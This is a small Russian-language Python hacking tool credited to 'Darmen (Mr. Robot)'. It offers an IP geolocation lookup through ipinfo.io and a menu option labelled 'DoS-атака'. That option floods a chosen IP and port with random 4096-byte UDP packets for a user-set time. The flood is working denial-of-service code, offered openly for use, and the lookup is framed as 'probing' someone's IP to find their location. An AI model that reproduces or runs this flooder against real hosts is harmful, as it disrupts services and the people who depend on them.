import requests, json, os, socket, time, random
 
def ip():
	print('Введите IP-адрес (если хотите пробить свой IP-адрес, то ничего не вводите):')
	ip = input('>>> ')
	if ip == '':
		try:
			response = requests.get('https://ipinfo.io/json')
		except:
			print('Ошибка!')
			print('----------')
			main()
	else:
		try:
			response = requests.get('https://ipinfo.io/' + ip + '/json')
		except:
			print('Ошибка!')
			print('----------')
			main()
	r = response.json()
	try:
		try:
			print('[IP-адрес] : ' + r['ip'])
		except:
			pass
		try:
			print('[Страна] : ' + r['country'])
		except:
			pass
		try:
			print('[Регион] : ' + r['region'])
		except:
			pass
		try:
			print('[Город] : ' + r['city'])
		except:
			pass
		try:
			print('[Имя устройства] : ' + r['hostname'])
		except:
			pass
		try:
			print('[Местоположение] : ' + r['loc'])
		except:
			pass
		try:
			print('[Провайдер] : ' + r['org'])
		except:
			pass
		try:
			print('[Часовой пояс] : ' + r['timezone'])
		except:
			pass
		try:
			print('[Почтовый индекс] : ' +  r['postal'])
		except:
			pass
	except:
		print('Ошибка!')
	print('----------')
	main()

def dos():
	print('Введите IP-адрес (если хотите пробить свой IP-адрес, то ничего не вводите):')
	ip = input('>>> ')
	if ip == '':
		ip = '127.0.0.1'
	print('Введите порт:')
	try:
		port = int(input('>>> '))
	except:
		print('Ошибка!')
		print('----------')
		main()
	print('Введите время атаки (в сек.).')
	try:
		duration = int(input('>>> '))
	except:
		print('Ошибка!')
		print('----------')
		main()
	try:
		client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	except:
		print('Ошибка!')
	packages_sent = 0
	bytes = random._urandom(4096)
	timeout = time.time() + duration
	try:
		while True:
			if time.time() > timeout:
				break
			try:
				client.sendto(bytes, (ip, port))
			except socket.gaierror:
				print('Ошибка!')
				break
			packages_sent += 1
			print(f'Отправлено {packages_sent} пакетов на {ip}:{port}. Для выхода нажмите Ctrl+C.')
	except KeyboardInterrupt:
		print('\nЗавершение...')
		time.sleep(.3)
		print('----------')
		main()
	print('----------')
	main()

def main():
	print('[1] Пробив по IP-адресу')
	print('[2] DoS-атака')
	print('[0] Выход')
	a = input('>>> ')
	if a == '1':
		ip()
	elif a == '2':
		dos()
	elif a == '0':
		print('Завершение...')
		time.sleep(1)
		exit()
	else:
		print('Неизвестная команда!')
		print('----------')
		main()

def clear():
	if os.sys.platform == 'win32':
		os.system('cls')
	else:
		os.system('clear')

def banner(): 
	print('''  _____   _____   _____   _____   _____   _____   _____   _   _  ''')
	print(''' |  ___| |  ___| |  _  | |  ___| |_ _ _| |  ___| |__ __| | | | | ''')
	print(''' | |___  | |___  | | | | | |       | |   | |___    | |   | |_| | ''')
	print(''' |  ___| |____ | | | | | | |       | |   |  ___|   | |    |_ _|  ''')
	print(''' | |      ___| | | |_| | | |___   _|_|_  | |___    | |     | |   ''')
	print(''' |_|     |_____| |_____| |_____| |_____| |_____|   |_|     |_|   ''')
	print('''                                                                 ''')
	print(''' Разработчик: Darmen (Mr. Robot)                                 ''')
if __name__ == '__main__':
	clear()
	banner()
	main()
